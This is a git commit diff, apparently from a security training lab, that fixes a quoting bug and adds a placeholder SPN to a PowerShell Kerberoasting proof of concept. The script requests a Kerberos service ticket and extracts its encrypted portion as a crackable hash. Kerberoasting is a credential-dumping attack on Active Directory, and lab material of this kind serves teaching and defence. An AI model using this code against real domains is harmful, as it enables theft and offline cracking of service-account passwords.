6d74b9b693fd7325deeb6b14969503c3b9bd3927
Howard <newtonguass@gmail.com>
2020-05-31 02:57:47 +0800

    fix string enclosure problem

--- Lab3_CredentialDumpingAndLateralMovement/POCKerberoasting/Kerberoasting.ps1
+++ Lab3_CredentialDumpingAndLateralMovement/POCKerberoasting/Kerberoasting.ps1
@@ -1,3 +1,4 @@
+$SPNName = "SomeSPNOfDomain"
 Add-Type -AssemblyNAme System.IdentityModel
 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
 $TicketByteStream = $Ticket.GetRequest()
@@ -7,7 +8,7 @@ if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.....
     $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
     $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
     if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482'){
-        Write-Warning ""Error parsing ciphertext for the" $SPNName
+        Write-Warning "Error parsing ciphertext for the" $SPNName
         $Hash = $null
     }else{
         $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
